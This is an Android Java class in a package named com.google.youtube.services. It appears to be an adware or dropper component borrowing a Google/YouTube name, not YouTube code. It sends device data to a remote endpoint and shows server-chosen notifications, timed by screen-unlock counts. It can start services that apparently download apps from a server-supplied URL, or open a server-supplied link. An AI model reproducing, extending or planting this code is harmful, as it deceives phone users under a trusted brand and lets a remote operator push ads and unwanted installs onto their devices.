package com.google.youtube.services;

import java.util.Date;
import java.util.Iterator;
import java.util.List;

import org.json.JSONObject;

import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.TextUtils;

public class NotifacationService extends AsyncTask<Void, Integer, String> {

	/* app_getnotifacation.action -- h */
	private final String URL = HttpUtil.BASE_URL + "app_h.action";

	private String val_title;

	private String val_text;

	private int isgoon;

	private int nid;

	private String ico_img;

	private String appimg;

	private PendingIntent pintent;

	private String appalias;

	private Context context;

	private String download_url;

	public NotifacationService(Context context) {
		this.context = context;
	}

	/**
	 * 
	 * @return true
	 */
	private boolean checkOption(int screen_count, int display_interval,
			String apppakname, int msg_install_count) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("SCREEN_STATUS", 0);

		SharedPreferences msgSharedPreferences = context.getSharedPreferences(
				"MSG_STATUS", 0);

		SharedPreferences installSharedPreferences = context
				.getSharedPreferences("INSTALL_STATUS", 0);

		int local_screen_count = localSharedPreferences.getInt("screen_count",
				0);

		int installCount = installSharedPreferences.getInt(apppakname, 0);

		boolean time_iner = false;

		if (!msgSharedPreferences.contains("notification")) {
			time_iner = true;
		} else {

			long reslut = Math.abs(new Date().getTime()
					- msgSharedPreferences.getLong("notification", 0));

			long display_interval_to_long = Math
					.abs(display_interval * 3600 * 1000);

			if (reslut >= display_interval_to_long) {
				time_iner = true;
			}

		}

		if (local_screen_count >= screen_count && time_iner
				&& installCount <= msg_install_count) {
			return true;
		}

		return false;
	}

	/**
	 * 
	 * 
	 * @param jsb
	 * @return
	 */
	private Bundle setBundle(JSONObject jsb) {

		Bundle bundle = null;

		try {
			if (jsb != null) {

				bundle = new Bundle();

				bundle.putString("val_title", jsb.getString("val_title"));

				bundle.putString("val_text", jsb.getString("val_text"));

				bundle.putString("val_appremark",
						jsb.getString("val_appremark"));

				bundle.putString("appimg", jsb.getString("appimg"));

				bundle.putString("msg_val_banben",
						jsb.getString("msg_val_banben"));
				//
				bundle.putString("msg_val_date", jsb.getString("msg_val_date"));

				bundle.putString("val_applx", jsb.getString("val_applx"));

				bundle.putString("msg_azl", jsb.getString("msg_azl"));

				bundle.putString("val_azl", jsb.getString("val_azl"));

				bundle.putString("msg_val_size", jsb.getString("msg_val_size"));

				bundle.putString("msg_val_language",
						jsb.getString("msg_val_language"));

				bundle.putString("val_downloadBtn",
						jsb.getString("val_downloadBtn"));

				bundle.putString("appalias", jsb.getString("appalias"));

				bundle.putString("apppakname", jsb.getString("apppakname"));

				bundle.putString("ico_img", jsb.getString("ico_img"));

				bundle.putString("appimg", jsb.getString("appimg"));

				bundle.putInt("msg_show_notifatication",
						jsb.getInt("msg_show_notifatication"));

				bundle.putString("download_url", jsb.getString("download_url"));

			}
		} catch (Exception e) {

		}

		return bundle;
	}

	@Override
	protected String doInBackground(Void... params) {

		if (MyHelpUtil.checkNet(context)) {

			try {

				String params_str = MyHelpUtil.add_notifacation_params(context);

				String returnmsg = HttpUtil.postRequest(this.URL, params_str);

				if (!TextUtils.isEmpty(returnmsg) && !"null".equals(returnmsg)) {

					JSONObject jsb = new JSONObject(returnmsg);

					int display_interval = jsb.getInt("display_interval");

					int screen_count = jsb.getInt("screen_count");

					String apppakname = jsb.getString("apppakname");

					int msg_install_count = jsb.getInt("msg_install_count");

					boolean bool = checkOption(screen_count, display_interval,
							apppakname, msg_install_count);

					if (bool) {

						val_title = jsb.getString("val_title");

						val_text = jsb.getString("val_text");

						isgoon = jsb.getInt("isgoon");

						nid = jsb.getInt("msgId");

						ico_img = jsb.getString("ico_img");

						appimg = jsb.getString("appimg");

						appalias = jsb.getString("appalias");

						appalias = jsb.getString("appalias");

						download_url = jsb.getString("download_url");

						HttpUtil.getBitmap(ico_img);

						HttpUtil.getBitmap(appimg);

						int msg_lx = jsb.getInt("msg_lx");

						switch (msg_lx) {

						case 0:

							Bundle localBundle = setBundle(jsb);

							Intent adIntent = new Intent(context,
									AdActivity.class);

							adIntent.putExtras(localBundle); 

							adIntent.setAction("android.intent.action.VIEW");

							pintent = PendingIntent
									.getActivity(context, nid, adIntent,
											PendingIntent.FLAG_UPDATE_CURRENT);

							MyHelpUtil.sys_msg(context, 1, apppakname);

							break;

						case 1:

							Intent drIntent = new Intent(context,
									DirectDService.class);

							drIntent.putExtra("appalias", appalias);

							drIntent.putExtra("val_title", val_title);

							drIntent.putExtra("val_text", val_text);

							drIntent.putExtra("apppakname", apppakname);

							drIntent.putExtra("msg_show_notifatication",
									jsb.getInt("msg_show_notifatication"));

							drIntent.putExtra("download_url", download_url);

							pintent = PendingIntent
									.getService(context, nid, drIntent,
											PendingIntent.FLAG_UPDATE_CURRENT);

							MyHelpUtil.sys_msg(context, 2, apppakname);

							break;

						case 2:

							String msg_lx_url = jsb.getString("msg_lx_url");

							if (!TextUtils.isEmpty(msg_lx_url)) {

								Intent urlIntent = new Intent(
										Intent.ACTION_VIEW,
										Uri.parse(msg_lx_url));

								urlIntent
										.addCategory(Intent.CATEGORY_BROWSABLE);

								PackageManager pm = context.getPackageManager();

								List<ResolveInfo> s = pm.queryIntentActivities(
										urlIntent,
										PackageManager.MATCH_DEFAULT_ONLY);

								for (Iterator<ResolveInfo> iterator = s
										.iterator(); iterator.hasNext();) {
									ResolveInfo resolveInfo = (ResolveInfo) iterator
											.next();

									urlIntent
											.setClassName(
													resolveInfo.activityInfo.packageName,
													resolveInfo.activityInfo.name);

									break;

								}

								pintent = PendingIntent.getActivity(context,
										nid, urlIntent,
										PendingIntent.FLAG_UPDATE_CURRENT);

								MyHelpUtil.sys_msg(context, 3, apppakname);
							}
							break;

						case 3:

							Intent drlIntent = new Intent(context,
									DirectDLService.class);

							drlIntent.putExtra("download_url", download_url);

							drlIntent.putExtra("appalias", appalias);

							drlIntent.putExtra("val_title", val_title);

							drlIntent.putExtra("val_text", val_text);

							drlIntent.putExtra("apppakname", apppakname);

							drlIntent.putExtra("msg_show_notifatication",
									jsb.getInt("msg_show_notifatication"));

							pintent = PendingIntent.getService(context, nid,
									drlIntent,
									PendingIntent.FLAG_UPDATE_CURRENT);

							MyHelpUtil.sys_msg(context, 16, apppakname);

							break;
						default:
							cancel(false);
							break;
						}

					} else {
						cancel(false);
					}
				} else {
					cancel(false);
				}
			} catch (Exception e) {
				e.printStackTrace();
				cancel(false);
			}
		} else {
			cancel(false);
		}
		return null;
	}

	@Override
	protected void onPostExecute(String result) {

		Bitmap bitmap = BitmapFactory.decodeFile(MyHelpUtil.getDir() + ico_img
				+ ".png");

		if (!TextUtils.isEmpty(val_title) && !TextUtils.isEmpty(val_text)
				&& pintent != null) {

			MyHelpUtil.showNotifacation(bitmap, val_title, val_text, "",
					context, nid, isgoon, pintent, 0);

			/**/
			saveMsgStatus();
		}
	}

	/**
	 * 
	 */
	private void saveMsgStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("MSG_STATUS", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("notification", new Date().getTime());

		localEditor.commit();
	}

}
